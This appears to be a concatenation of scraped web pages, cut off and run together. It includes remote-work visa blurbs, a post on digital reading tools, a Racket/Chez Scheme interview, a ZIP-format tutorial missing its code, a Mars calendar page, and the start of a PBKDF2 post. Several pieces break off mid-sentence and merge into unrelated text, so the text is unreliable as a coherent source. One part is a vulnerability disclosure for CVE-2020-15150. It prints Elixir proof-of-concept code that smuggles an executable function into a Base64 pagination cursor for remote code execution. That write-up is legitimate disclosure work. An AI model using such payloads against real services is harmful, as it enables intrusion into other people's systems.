<p>But there’s some fine print: You have to be gainfully employed elsewhere, and earn nearly six figures.”</p>



<figure></figure>







<h2>Dubai, UAE</h2>



<p>“The UAE city is opening a new programme for remote workers, allowing you to go to the hotspot and ‘work from home’ there for a year. Successful applicants will be entitled to all of the city’s services, as well as having access to the co-working spaces. Plus, there will be ample opportunity to explore the city’s world-famous beaches, restaurants and landmarks.</p>



<p>The programme costs approximately £217.80, and you’ll also need to pay for health insurance with ‘valid UAE coverage’, as well as a processing fee.”</p>



<figure></figure>



<h2>Georgia (the country, Americans)</h2>



<p>“‘Remotely from Georgia’, a new state programme that allows foreign citizens to travel to and work remotely from Georgia, has started today. Foreigners from 95 countries will be allowed to apply for the programme if they intend to stay in Georgia for at least 180 days.&nbsp;</p>



<p>Also, they must prove they have the financial ability to pay taxes while staying in Georgia and should have a minimum monthly salary of $2,000.”<br></p>

November 27, 2020 | https://jon.bo/posts/digital-tools/ | <a href="https://web.archive.org/web/*/https://jon.bo/posts/digital-tools/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>My digital life in a nutshell: I discover relevant content I don’t have time to consume, I find time and become overwhelmed with my scattered backlog, I wish the content were in a different format, and then I’m unable to find something again once I’ve consumed it. <a href="https://andymatuschak.org/books/">Not retaining enough</a> is a valid problem but we’ll tackle that one later.</p><p>There’s a lot of generalization in my summary but <strong>the core issue is an extraordinarily high level of friction in the process of finding, organizing, and sharing digital content</strong>. During the past few years I’ve noticed:</p><ul><li><p>The more seamless the acquisition &amp; ingestion, the more engaged I am with the content</p></li><li><p>Insights are just as likely to be found in a 400-page book as in a 40-minute podcast</p></li><li><p>Notes and their subsequent review are essential for long-term retention</p></li><li><p>Recommendations from other humans are as good, if not better, than algorithmic suggestions</p></li></ul><p>In the rest of this post I attempt to explain the digital tools I wish existed, and how the the currently available tools do not suffice. What are also probably lacking are my <a href="https://www.buildingasecondbrain.com/">habits and workflows</a> around this - but I’m looking at tools specifically here.</p><h2 id="queue-management-for-inbound-digital-content">Queue management for inbound digital content&nbsp;<a href="#queue-management-for-inbound-digital-content">#</a></h2><p>Where to begin? Probably the most common problem I see myself and other people dealing with is processing the incoming deluge of articles to read and videos to watch. This isn’t all personal recommendations - it encompasses any and all content I think my future self would appreciate me consuming. A list of issues, roughly by order of appearance:</p><ul><li><p>Content (or links to it) arrive from a variety of sources including text messages from friends, email conversations, tweetstorms and replies, references in books, suggestions in real-world conversations, and more.</p></li><li><p>Every book, article, post, or tweet has the potential to lead to more content.</p></li><li><p>Content is published in a variety of formats including but not limited to images, sound files, videos, Google Drive docs, diagrams, long-form paywalled articles, PDFs, powerpoint presentations, and base 64 encoded blobs.</p></li><li><p>I have little visibility into required time investment and foundational context until I’ve opened it and started thinking about it. Should I sit down with a pen and paper to read this or can I skim it while waiting for my coffee?</p></li><li><p>Learning, work, news, and entertainment all have different priorities in my life (roughly in that order).</p></li><li><p>I would like to batch process content in different “streams” regardless of where they are stored. For example: I have two hours, let me work through interesting text content my friends sent me last week. Or: show me all the interesting/relevant videos I’ve queued over the past month.</p></li><li><p>I’m not always connected to a stable internet connection.</p></li><li><p>If it’s a long piece of content I want my position saved reliably so I can resume at a later point.</p></li><li><p>I often want it in a different format than the one it was originally published in (audio → text, text → audio, pdf → ebook). Automated conversion works but is cumbersome. Listening to text articles requires sending them to a special app and converting articles to ebooks is annoying and loses a lot of formatting and navigation.</p></li><li><p>I love to respond to a person’s recommendation - preferably before they’ve forgotten why they sent me it in the first place.</p></li><li><p>I’d like a centralized history of content tied to my notes and annotations in case I want to find it again later. It feels like every week I’m speaking with someone and I remember a blog post I read a few months ago they might find relevant … or was it a Reddit post? Can I find it my history? Oh no, it’s been replaced with <code>[deleted]</code> … find an archived copy… rinse and repeat.</p></li></ul><figure><img src="https://imgs.xkcd.com/comics/icon_swap.png"><figcaption>Relevant XKCD, as is tradition</figcaption></figure><p>Following my curiosity feels like chasing a caffeinated bunny around while real understanding requires time, perspective, and reflection. The internet makes the former much easier - so I find myself constantly balancing the two. Additionally, my energy and attention levels vary throughout the day and it’s far easier to just open Twitter rather than continue reading a long-form article I started on my laptop two days ago. Too often I default to the lower-friction one.</p><p>Honorable Mentions: <a href="https://getpocket.com/">Pocket</a>, <a href="https://www.instapaper.com/">Instapaper</a></p><h2 id="a-universal-book-log-recommendation-sharing-system">A universal book log, recommendation &amp; sharing system&nbsp;<a href="#a-universal-book-log-recommendation-sharing-system">#</a></h2><p>I love exploring other peoples’ reading lists. Here’s <a href="https://jon.bo/books">my own</a>. I find everyone keeps their reading lists in different formats on different platforms. Plaintext lists are nice but hard to parse. Spreadsheets are easy to parse but a pain to manage. Third-party services aren’t interoperable, require logins, and are not future-proof.</p><p>Part of the problem here is <a href="https://people.well.com/user/doctorow/metacrap.htm">metadata is hard</a>. Someone has to sit there and fill out the author, title, subtitle, summary, page count - and they’re probably not going to do it for free. Amazon is a good at it but <a href="https://stallman.org/amazon.html#publishing">is hostile to publishers</a>. Goodreads has much potential but <a href="https://onezero.medium.com/almost-everything-about-goodreads-is-broken-662e424244d5">seems to have stagnated</a>. Linking to the book’s Wikipedia entry would be my preference but very few books have an entry.</p><p>Whatever this tool for managing my ever-growing reading list will be, it should:</p><ul><li><p>Let me compare my reading list with another to see overlap. I find this a wonderful way to spark conversation and find common interests.</p></li><li><p>Allow me to tag books instead of placing them into static lists (think clusters or tag clouds).</p></li><li><p>Be tied to my highlights, annotations, and bookmarks in a non-proprietary, searchable, and shareable format. Make them public if I want to.</p></li><li><p>Save context on where and when I found this book: why I thought it was important to read, when I read it, what I wrote down while reading it, and what other content I discovered through it.</p></li><li><p>Let me query this tool like a relational database. For example: show me all books about scaling startups recommended by people I follow on Twitter or by people they follow. The current Twitter search makes me feel like I’m using a government site created before I myself even knew what a computer was.</p></li><li><p>Help me <a href="https://www.lesswrong.com/posts/Kmch6T2YscMyLFJD9/rational-reading-thoughts-on-prioritizing-books">deal with prioritization</a>. My reading list is a mess and I can’t be alone. Are certain books better read before others? Prerequisites? Could three of them be replaced with one? What are the other books by the this author? Are they worth reading too? Why exactly did I think reading this 800 page book was relevant when I added it? <a href="https://www.samuelthomasdavies.com/book-summaries/health-fitness/the-checklist-manifesto/">Is 80% of the content attainable from a blog post?</a> Where is that post? Has someone in my network written a rebuttal to the ideas in this book? The list goes on and on.</p></li><li><p>Provide relevant suggestions with the typical recommender approach based on what people interested in the same topics also enjoyed reading and learning from.</p></li></ul><p>Honorable Mentions: None :(</p><h2 id="intelligent-pdf-viewers-ebook-readers-audiobook-podcast-players">Intelligent PDF viewers, eBook readers, audiobook &amp; podcast players&nbsp;<a href="#intelligent-pdf-viewers-ebook-readers-audiobook-podcast-players">#</a></h2><figure><img src="https://d33wubrfki0l68.cloudfront.net/5aa98bca712e33bc729c180c9a588f4d5ac7e9af/c5011/digital-tools/ebook-concept.png"><figcaption>Functionality I want in my document reader</figcaption></figure><p>Reading is incredible and I love my Kindle. But eBooks today are just a step above OCR’ing a book and slapping on a few basic features which have existed for 30+ years. While I’m reading an eBook I want to:</p><ul><li><p>Have relevant illustrations, graphs, and tables appear for duration of their mentions so I don’t have to flip back and forth between them.</p></li><li><p>See glossary terms and their definitions which appear on this page. Highlighting and searching a term is great but the author may have added important context to the glossary definition.</p></li><li><p>View popular annotations and highlights across <strong>all</strong> mediums - not just by other readers who own an Amazon Kindle readers and purchased this book version and also happened to highlight it enough times. A quote was referenced in 300 blog articles? A two sentence excerpt retweeted 50,000 times? You bet I want to know!</p></li><li><p>Follow referenced information easily. You cited a paper - great, let’s look at the footnotes. Oh, the full reference is in the back of the book. Online list of citations? Of course not! Drop a bookmark, navigate to the back of the book, pull out my laptop, find the paper. Of course, a paywall. Grab a snack. Acquire the PDF. Search for keywords to try to find the referenced information. Sigh, 2019.</p></li><li><p>Not be hindered by the DRM system. Copyright is important and I want to support authors but it’s insane to me all these content licenses I’m acquiring can’t be donated to a library upon account closure. Yes, legal DRM-free eBooks exist but they aren’t without their own issues.</p></li><li><p>Seamlessly switch between devices and formats while retaining my position. Something like Whispersync (<a href="https://www.amazon.com/gp/feature.html?ie=UTF8&amp;docId=1000827761">a neat idea</a> but come on, I’m not made of money. Also, see above points).</p></li><li><p>Let me use a digital or physical keyboard instead of an e-ink keyboard to type my annotations. A possibility here is a companion app, which feels like a notes app but ties my notes to their location/text in the book I’m reading.</p></li></ul><figure><img src="https://d33wubrfki0l68.cloudfront.net/7bc95c0c51628e5ba06ddb7e688a58c600e503c8/81599/digital-tools/audiobook-player.png"><figcaption>What I want my audiobook player to look like</figcaption></figure><p>Most of these points above also apply to my experience listening to podcasts, audiobooks, and watching Youtube videos and interviews. I find myself wishing I could:</p><ul><li><p>Navigate them more comfortably. Both Libby and Audible leave much to be desired in terms of navigation. Finding a quote I remember hearing to three days ago is basically blindly stumbling around - and I lose my current spot too. Seeing a list of chapter numbers for the book I’m <strong>listening to</strong> has been helpful a grand total of 0 times. And how cool would it be to drop a bookmark from my bluetooth-connected headphones as I’m biking down a street.</p></li><li><p>View an auto-generated transcript of a podcast as I’m listening to it. It should have easy-to-follow links to references to other podcasts, media, books and support searching for key terms. YouTube already transcribes all of their videos and Google Meet now generates live captions as we’re talking - why can’t we do something similar with podcast apps?</p></li></ul><p>Honorable Mentions: <a href="https://readwise.io/">Readwise</a>, <a href="https://www.weavatools.com/">Weava</a>, <a href="https://www.descript.com/">Descript</a>, <a href="https://otter.ai/">Otter.ai</a>, <a href="https://getpolarized.io/#features">Polar</a></p><h2 id="a-centralized-search-interface-for-my-digital-brain-memex">A centralized search interface for my digital brain (memex)&nbsp;<a href="#a-centralized-search-interface-for-my-digital-brain-memex">#</a></h2><p>I want to be able to open an interface, type three words, and instantly see results from everything my digital self has interacted with.

What makes it stand out in the LISP family?</strong></h2><p id="b428">Let’s distinguish “Racket the language” and “Racket the project”.</p><p id="f2e2">The Racket language is a general-purpose, Scheme-like language with an especially rich set of constructs for extending the language — even by Scheme standards. Racket includes support for writing quick-and-dirty macros, but it also supports nice macros with a good error checking that avoid surprising errors created in the expanded code. The close integration of macros and modules, an enforced phase separation between run-time and compile-time code, and the `#lang` mechanism for selecting the surface syntax all distinguish Racket from other Lisp variants.</p><p id="d48e">Even the main language Racket is written in a simpler language, and that is written in an even more simple language. This tower of languages makes development easier. You can look under the hood and see all the internal languages, or just ignore all of them and get a nice high level language.</p><p id="36f0">Less prominent, but also as important in practice for building language abstractions and composing them into large systems, are Racket’s run-time constructs: first-class control with continuation marks, custodians for simple and reliable task termination, reachability-based memory accounting, message-based parallelism via places, and Concurrent ML-style constructs for event-driven programs. Many of these constructs need support at lower levels of the runtime system, but then they can be used to build a wide variety of languages and libraries that mesh well.</p><p id="cb77">The Racket project synthesizes research, production, and education efforts toward the overall language-building goal. The idea of “A Programmable Programming Language” serves along those directions, from building student-friendly learning environments to domain-specific languages in application to pushing the frontiers of language design and implementation.</p><p id="a39d">The main page is <a href="https://racket-lang.org/" rel="noopener">https://racket-lang.org/</a></p><h2 id="47bc"><strong>What does it mean that you can write your own language?</strong></h2><p id="8534">For example, when you install Racket, it comes with 20 or 30 additional languages. (I’m not sure if someone has counted all of them.)</p><p id="adb8">There are a few “Student” languages that are designed for students. They are less powerful but have more compile time checks to detect common errors in beginners. And they have different levels so once you master one, you can use the next one that includes more features.</p><p id="e7f1">Another language is Typed Racket, that adds types to the Racket expressions, so it refuses to compile unless the types check. And it also uses the type information to optimize the code, so the compilation is slower, but the generated code can be faster.</p><p id="b5fa">There are languages that implement the version of Scheme in R5RS and R6RS and many of the SRFI. And you can install a package that adds the version in the R7RS-small.</p><p id="8dd3">And there are also more different languages with a very different syntax like a complete implementation of Algol 60.</p><p id="d422">All these languages share the same backend and you can call the libraries written in one language from any of the other languages that are included in the distribution, the additional languages you can download as packages, or the languages you create.</p><p id="7932"><strong>What’s the difference between Racket and Scheme?</strong></p><p id="f375">Racket started out as a Scheme implementation, and we would still call it “a Scheme.” Even though it does not fit a Scheme standard, it’s obviously derived from Scheme. There are many specific differences, such as the fact that `cons` always creates an immutable pair in Racket, but the main difference is philosophy: Scheme is meant to be a small language that gives you just enough to express lots of things. Racket is meant to be a big language, and while it gives you the same core pieces (and more) that can express lots of things, it also codifies the way many things are done to enable more cooperating libraries and languages.</p><h2 id="0256"><strong>What is Chez Scheme, how is it different from other Scheme implementations?</strong></h2><p id="1fb3">Chez Scheme is one of the oldest Scheme implementations, and its evolution informed many parts of the Scheme standard through R6RS. (Racket’s influence on the Scheme standard, in contrast, is limited to aspects of the R6RS library design.) Chez Scheme is a relatively small language, but like all instantiations of Scheme, the implementation provides a lot more than the standard specifies.</p><p id="3c1c">Chez Scheme’s biggest claim to fame is its performance. It has always been among the best-performing Scheme implementations. Its object-tagging and allocation regime, its hybrid stack–heap implementations of continuations, and its compiler structure all remain state-of-the-art, even in 2020.</p><p id="3095">For most of its existence, Chez Scheme was a proprietary, closed-source implementation, but it became open source in mid-2016. As it happens, we started considering a new Racket reimplementation around the start of 2017.</p><h2 id="54ea"><strong>Why did you choose Chez Scheme over other Schemes to rebuild Racket?</strong></h2><p id="db07">The biggest weakness of the Racket BC (“before Chez”) implementation are its back-end compiler structure, its inefficient internal calling conventions (over-adapted to C), and its poor implementation of first-class continuations. Those are exactly the strengths of Chez Scheme. Furthermore, Racket’s evaluation model was always closely aligned with Chez Scheme, such as the emphasis on interactive evaluation and compilation.</p><p id="d9a4">It was clear up front that Chez Scheme lacked significant features that Racket needs, such as support for continuation marks and reachability-based memory accounting. However, the high quality of the Chez Scheme design and implementation, in contrast to old Racket’s implementation, made adapting Chez Scheme more appealing than retrofitting Racket’s old implementation further.</p><h2 id="28e7"><strong>Why reimplement with Chez Scheme to reduce the C part instead of implementing the C stuff in Racket?</strong></h2><p id="2658">Mostly, we did reimplement the C stuff in Racket. The I/O subsystem, the concurrency subsystem (which includes the scheduler for “green” threads, Concurrent ML-style events, and custodians), and the regexp matcher were all rewritten in Racket. Those pieces followed the rewrite of the macro expander in Racket. Other things that needed to be moved out of C, such as the compiler and the extensive support for numbers that Racket inherited from Scheme, were already written in Scheme in Chez Scheme’s implementation.</p><p id="b995">A big part of the process was to understand what to implement in Racket, what in Chez Scheme, and what new layers to introduce in translation. This work and reorganization benefits other Racket implementation efforts, such as Pycket and RacketScript.</p><h2 id="de40"><strong>Besides improving maintainability, what are the advantages of building Racket with CS over C?</strong></h2><p id="4952">With the exception of the garbage collector and similar low-level parts of the runtime system, much of Racket’s implementation benefits from higher-level abstractions. Writing a macro expander in C was a particularly poor choice, since higher-level abstractions obviously make tree manipulations easier, but the same reasons apply for the I/O layer or numeric primitives. Even the garbage collector in [the Racket variant of] Chez Scheme is now half implemented by a specification and compiler that are written in Scheme.</p><p id="60db">The other big advantage is that the Racket community has a lot of Racket programmers, not C programmers. It’s easier to convince a fan of Racket to look at some code in Racket or Chez Scheme and try to find some bug or a new feature to contribute. The people that like to read and write code in C are probably making contributions to a C compiler.</p><h2 id="e706"><strong>What were the most challenging parts to implement?</strong></h2><p id="971c">The most challenging part is not really one part, but the overall scale. Racket is a big language, and it all has to work the same in the new implementation. That means not just getting the right result and/or a specific kind of error message, but getting results with the same or better performance characteristics. For example, if a macro generates a giant expansion that nevertheless compiles in reasonable time in Racket BC, then it needs to compile in reasonable time in Racket CS.</p><p id="c985">When it comes to specific pieces that we had to implement, perhaps the most challenging were adding type reconstruction to the compiler, adding support for continuation marks, allowing record values to act as procedures, reimplementing Racket’s I/O, and upgrading Chez Scheme’s …</p></div></div></section></div>

<p>Let's try creating a ZIP file from scratch. Since I'm mostly interested in the layout and meta-data we'll be using the option to add
the files <em>uncompressed</em>. That means I don't have to learn the [deflate] compression algorithm at the same time.
The resulting knowledge is still useful in that it will allow us to bundle a set of files into a single, ubiquitous format.
</p>
<p>unix [cpio] (or even [tar]) would be easier but it's not ubiquitous.... I'm looking at you DOS.
</p>
<p>I'll be using C for this, <s>since it's ubiquitous</s>... since I like it. Also, C is good for the kind of low-level bit manipulation
we'll be doing here.
Even if you don't like C there is still some useful information here about the zip file format.
(I was going to use Common Lisp, but it's not ubiquitous.)
</p>
<p>Useful resources:

</li></ul>
<h2> simplest zip file</h2>
<p>Zip files are read <em>from the end</em>. This allows the zip file to built in a single pass.
(It also allows some other tricks like prefixing data at the start of a zip file e.g. an executable to unpack the remainder.)
</p>
<p>A zip reader finds the final record by searching backwards for the record's magic number e.g. 0x06054b50
(a record is just a block of bytes in the file).
Every zip file must contain an <code>End of Central Directory Record</code> and the 
simplest zip file consists of only an End of Central Directory Record. That would be an empty zip file, but a zip file nevertheless.
</p>
<p><span>note the mention of disk numbers, this file format was invented back in the days of archives spanning multiple floppy disks.</span>
</p>
<p>The EOCD format is given here.
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)">https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)</a>
</p>
<p>Remember that all integers (including the magic) must be written little-endian (i.e. byte reversed).
I will assume your platform does that automatically since most people will be using an Intel/AMD processor.
(Check the C functions ntohs() and ntohl() if your platform is big endian.)
</p>
<p>This is the C function which will write the EOCD record.

<p>Build the code and call the program to produce our zip file (on stdout):

<pre>$ make mkzip
$ ./mkzip &gt;ex.zip
$ file ex.zip
ex.zip: Zip archive data (empty)
</pre>
<p>Congratulations! We have created a zip file from scratch. That will be all for today. Thank you for watching...

<h2> adding some files</h2>
<pre>$ unzip -l ex.zip
Archive:  ex.zip
warning [ex.zip]:  zipfile is empty
</pre>
<p>Ok, so we'd actually like to add some files to our archive. Otherwise what's the point?
</p>
<p>Every file we add must be prefixed with a <code>local file header</code> and, after all the files are added, we add a <code>Central Directory</code> record which
contains the locations (offsets) of all those files.
</p>
<p>Firstly let's add the local file header. It needs the length of the file and the length of the file name. No problem.
More difficult is that the header needs the CRC32 checksum of the file (to allow the zip reader to check the integrity of the archive).
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#Local_file_header">https://en.wikipedia.org/wiki/ZIP_(file_format)#Local_file_header</a>
</p>
<p><span>The trailing data descriptor record which can be used to add the CRC32 checksum and file size/compressed size <em>after</em> we've written the file. This can help simplify the zip writer's job. We will not use these here.</span>
</p>
<p>I have a feeling that CRC32 checksums will be difficult. So let's just write a <strong>zero crc32</strong> and see what happens...
</p>
<a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check#CRC-32_algorithm">https://en.wikipedia.org/wiki/Cyclic_redundancy_check#CRC-32_algorithm</a>
<p>Call <code>local_file_header</code> for each file we want to add to the zip. I've defined a struct <code>zfile_t</code> to hold the file name and some
other information like it's size and crc32 (set to zero for now). <span>full code linked at the end</span>.

<h2> the central directory</h2>
<p>This record/block contains a list of all the files in the archive (it need not contain all the files we added, nor list them in the same
order; this allows deleting files without rewriting the entire archive, important if you have 10 floppy disks...).
</p>
<p>The central directory doesn't have a separate header. It's not really a record, more a sequence of records, one per file of interest.
These records are similar to the local file header records but have a few extra fields.
</p>
<p>Finally we must remember to update our, <em>now non-empty</em>, EOCD with link back to our central directory record. Until now we were just
writing zero into the EOCD fields [size of central directory] and [offset of central directory].
</p>
<p>We can easily capture the file offset before we start writing the Central Directory and get the size by subtracting it from the file
offset after we have written the Central Directory.

<p>Let's try unpacking our putative archive again. We learned that zip uses date formats based from 1980-00-00 (which is similar to the
unix epoch 1970-01-01, except with bigger shoulder pads and more hair gel). At the moment I'm not <em>too</em> interested in the timestamps.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="info">


  
  
  <p>A dithering playground, a calendar for another planet, a window on the inner solar system, an interactive map, all together. I wanted to learn some front-end libraries but also for curiosity 
    I imagined how a basic tool as the calendar should change on the most hyped planet of the solar system, Mars, where people will have to deal with 
    many hardships and limitations.</p>

    
   
    
  <p>This calendar is similar to ours. A year on Mars has 668 sols, days that span around 24h and 40 minutes, so a martian year roughly doubles our Earth year length, 
    and many people have imagined systems to divide them up. While scientists usually just count the sols from the start of the year and that's it, I think that when you have a continuous settlement it's convenient to have smaller chunks of time for 
    keeping track of repetitive matters. I based the subdivision on the Darian Calendar which divides the Mars Year in 24 months of 28 and 27 sols. The year starts every Vernal equinox, which is
  already the standard for scientists studying the martian seasons. When to count the year Zero from is a debated matter, the Darian Calendar uses 1610, others use 1953 (I did too), I think that when we'll have a continuous human presence it will probably restart from zero anyways.
  </p>

  
  
  <p>
    The martian life will bring heavy constraints to the first settlers: communication, dust storms, oxygen, energy, so to help with the most pressing and time-based of those I added some available information into the calendar. 
    Since any first colony will be still very dependant from Earth, communication with Earth will be super important, but with the distance between the two planets ranging from 100M to 400M kilometers, so the time gap for one-direction communication will vary between 5 and 20 minutes. Just imagine typing a url and wait forty minutes for a response.
    Even more crucial will be the supplies and people coming from Earth, so it will be useful to see in a glance upcoming transfer orbits and in general the positioning of the two planets.  <br>
    In the bottom right box I thought would be useful to have a handy small topographic map of the area of the outpost. Geography is helpful to navigate the rough terrains of Mars, but it also gives insights about one of the most precious resources on Mars: solar light.
    In this interactive map you can drag the marker around the map to see how solar irradiation changes during the seasons and throughout the latitudes.
  </p>
    

    
  

    <p>What started as a small learning project has become something I felt passionate about. I'm actually happy to show it around, 
      but at the same time I feel it could use some polishing (better cartography, better graphics, improved orbit calculations..).
      Also this project could take different shapes, for example I already printed a paper version for my desk!
    I really would like for this project to keep on growing and that would also help me give life to other ideas, so in case you are curious about them too, you can help me make those come true
 by purchasing the pdf version of the next Martian year, which will start on February 2021. </p>

 

 <p>

      It consists of 24 pages one for each month, and in each of them I handpicked the best dithered images I could get. I'm commited to continue to make improvements, 
      so for anybody buying this, I will gift a pdf of the new version when that will be ready. If you are really interested on those paper version of the calendar and the future twists this 
      or other projects will take, please sign up to the mailing list, of course no spammy intentions here.
    </p>

November 27, 2020 | https://www.alphabot.com/security/blog/2020/elixir/Remote-code-execution-vulnerability-in-Elixir-based-Paginator-project.html | <a href="https://web.archive.org/web/*/https://www.alphabot.com/security/blog/2020/elixir/Remote-code-execution-vulnerability-in-Elixir-based-Paginator-project.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2 id="intro">Intro</h2>

<p>In August of this year I found a remote code execution vulnerability in the Elixir-based <a href="">Paginator</a> open-source project from <a href="https://duffel.com/">Duffel</a> (a UK-based startup in the flight searching space).
The vulnerability has the CVE number <a href="https://github.com/duffelhq/paginator/security/advisories/GHSA-w98m-2xqg-9cvj">CVE-2020-15150</a> assigned. Since Duffel seemed to use Paginator for its own REST API it seems likely
that an attacker exploiting this vulnerability would have been able to execute code on Duffel’s (cloud) assets.</p>

<h2 id="vulnerability">Vulnerability</h2>

<p>This code execution vulnerability existed due to the use of Erlang’s <code>binary_to_term</code> in combination with untrusted user data.
This function is much more dangerous when used in Elixir.</p>

<p>The vulnerability could have been triggered via Paginator’s user provided before/after cursors. As seen in <a href="https://duffel.com/docs/api/overview/pagination">Duffel’s Pagination API</a>:</p>

<p><img src="https://www.alphabot.com/images/blog/elixir-paginator/duffel_paginator_api.png" alt="Duffel's Pagination REST API"></p>

<p>The string <code>g2wAAAACbQAAABBBZXJvbWlzdC1LaGFya2l2bQAAAB=</code> is a Base64 encoded binary serialized Erlang term (ETF).
Such an Erlang term can contain anything from simple string values to full-blown functions containing almost any code you’d like.
However, in normal Erlang such a function provided in the payload would not be executed automatically (at least if nobody explicitly calls that function).
In Elixir there’s a much higher chance that such a function is executed later down the road, thanks to the Enumerable protocol of Elixir.</p>

<h2 id="exploits">Exploits</h2>

<p>To demonstrate this vulnerability I created two exploits.
The first one starts <code>xcalc</code>:</p>

<figure><pre><code data-lang="elixir"><span>defp</span> <span>rce_start_xcalc</span><span>()</span> <span>do</span>
    <span>exploit</span> <span>=</span> <span>fn</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span>  <span>System</span><span>.</span><span>cmd</span><span>(</span><span>"</span><span>xcalc"</span><span>,</span> <span>[]);</span> <span>{</span><span>:cont</span><span>,</span> <span>[]}</span> <span>end</span>
    <span>payload</span> <span>=</span>
    <span>exploit</span>
    <span>|&gt;</span> <span>:erlang</span><span>.</span><span>term_to_binary</span><span>()</span>
    <span>|&gt;</span> <span>Base</span><span>.</span><span>url_encode64</span><span>()</span>
<span>end</span></code></pre></figure>

<p>The second one prints the stacktrace (so we see where our anonymous function has been triggered):</p>

<figure><pre><code data-lang="elixir"><span>defp</span> <span>rce_print_stacktrace</span><span>()</span> <span>do</span>
    <span>exploit</span> <span>=</span> <span>fn</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span>  <span>IO</span><span>.</span><span>inspect</span><span>(</span><span>Process</span><span>.</span><span>info</span><span>(</span><span>self</span><span>(),</span> <span>:current_stacktrace</span><span>),</span> <span>label:</span> <span>"</span><span>RCE STACKTRACE"</span><span>);</span> <span>{</span><span>:cont</span><span>,</span> <span>[]}</span> <span>end</span>
    <span>payload</span> <span>=</span>
    <span>exploit</span>
    <span>|&gt;</span> <span>:erlang</span><span>.</span><span>term_to_binary</span><span>()</span>
    <span>|&gt;</span> <span>Base</span><span>.</span><span>url_encode64</span><span>()</span>
<span>end</span></code></pre></figure>

<p>The functions above create a Base64 encoded exploit payload (same as the cursors used by Paginator).
However, they do not include information about the whereabouts of the cursor, but instead contain an anonymous function that we want the server to execute.
(An attacker would execute this functions above on his side, only providing the Base64 encoded payload to an API using Duffel’s Paginator.)</p>

<p>The stacktrace output of the second exploit payload looked like this (when executed from a unit test):</p>

<figure><pre><code data-lang="text">......RCE STACKTRACE: {:current_stacktrace,
[
{Process, :info, 2, [file: 'lib/process.ex', line: 767]},
{PaginatorTest, :"-rce_print_stacktrace/0-fun-0-", 2,
    [file: 'test/paginator_test.exs', line: 945]},
{Stream, :do_zip_next_tuple, 5, [file: 'lib/stream.ex', line: 1191]},
{Stream, :do_zip, 3, [file: 'lib/stream.ex', line: 1168]},
{Enum, :zip, 1, [file: 'lib/enum.ex', line: 2820]},
{Paginator.Ecto.Query, :filter_values, 4,
    [file: 'lib/paginator/ecto/query.ex', line: 43]},
{Paginator.Ecto.Query, :maybe_where, 2,
    [file: 'lib/paginator/ecto/query.ex', line: 103]},
{Paginator.Ecto.Query, :paginate, 2,
    [file: 'lib/paginator/ecto/query.ex', line: 12]},
{Paginator, :entries, 4, [file: 'lib/paginator.ex', line: 325]},
{Paginator, :paginate, 4, [file: 'lib/paginator.ex', line: 180]},
{PaginatorTest,
    :"test paginate a collection of payments, sorting by charged_at sorts ascending with before cursor",
    1, [file: 'test/paginator_test.exs', line: 78]},
{ExUnit.Runner, :exec_test, 1, [file: 'lib/ex_unit/runner.ex', line: 355]},
{:timer, :tc, 1, [file: 'timer.erl', line: 166]},
{ExUnit.Runner, :"-spawn_test_monitor/4-fun-1-", 4,
    [file: 'lib/ex_unit/runner.ex', line: 306]}
]}</code></pre></figure>

<p>This stacktrace reveals that the exploit function was triggered on <a href="https://github.com/duffelhq/paginator/blob/6f27a391d393924577d0e91d7a07c2dce89bac1d/lib/paginator/ecto/query.ex#L43">line 43 of query.ex</a> by the function <code>Enum.zip</code>:
our anonymous function is implicitly called by Elixir (thanks to the Enumerable protocol).</p>

<h2 id="additional-information">Additional information</h2>

<p>This is not the first time a vulnerability caused by the use of <code>binary_to_term</code> in combination with untrusted data has been found.
<a href="https://twitter.com/griffinbyatt">Griffin Byatt</a> probably discovered the first publicly known:
<a href="https://blog.voltone.net/post/10">Code execution through the session cookie</a> in the popular
and widely used Elixir <a href="https://hexdocs.pm/plug/readme.html">Plug</a>.</p>

<p>The Security Working Group of the Erlang Ecosystem Foundation has some recommendations regarding <a href="https://erlef.github.io/security-wg/secure_coding_and_deployment_hardening/serialisation">Serialisation and deserialisation</a>
including recommendations for mitigations.</p>

<div>
      
      <p>
        The official <a href="https://erlang.org/doc/man/erlang.html#binary_to_term-1">Erlang documentation</a> does "warn" about <code>binary_to_term/1</code>, and recommends <code>binary_to_term/2</code>.
        However, using <code>binary_to_term/2</code> is not a protection against the code execution shown here (especially not in Elixir). In fact the paginator library used <code>binary_to_term/2</code> with the <code>safe</code> option.
        Using <code>binary_to_term/2</code> with the <code>safe</code> option only protects against certain Denial of Service attacks.
      </p>
</div>

<h2 id="thanks">Thanks</h2>

<p>Thanks are in order for Duffel (the maintainers of this project):</p>
<ul>
  <li>Firstly: Duffel fixed the vulnerability in <b>less than one day</b> and acted very professionally throughout the process.</li>
  <li>Secondly: Despite not having a bug bounty program, Duffel payed a bounty of 1000 GBP, which I donated in parts to a
fund providing help for victims of the explosion in the port of Lebanon.</li>
</ul>

		<div>

			
<p>Imagine you’re a software developer, and you need to authenticate users based on a username and password.</p>



<p>If you’re well-read on the industry standard best practices, you’ll probably elect to use something like bcrypt, scrypt, Argon2id, or PBKDF2. (If you thought to use something else, you’re almost certainly doing it wrong.)</p>



<p>Let’s say, due to technical constraints, that you’re forced to select PBKDF2 out of the above options, but you’re able to use a suitable hash function (i.e. SHA-256 or SHA-512, instead of SHA-1).</p>



<p>Every password is hashed with a unique 256-bit salt, generated from a <a href="https://www.2uo.de/myths-about-urandom/">secure random generator</a>, and has an iteration count in excess of 80,000 (for SHA-512) or 100,000 (for SHA-256). So far, so good.</p>







<p>Let’s also say your users’ passwords are long, randomly-generated strings. This can mean either you’re building a community of password manager aficionados, or your users are actually software bots with API keys.</p>



<p>Every user’s password is, therefore, always a 256 character string of random hexadecimal characters.</p>



<p>Two sprints before your big launch, your boss calls you and says, “Due to arcane legal compliance reasons, we need to be able to detect duplicate passwords. It needs to be fast.”</p>



<p>You might might think, “That sounds like a hard problem to solve.”</p>



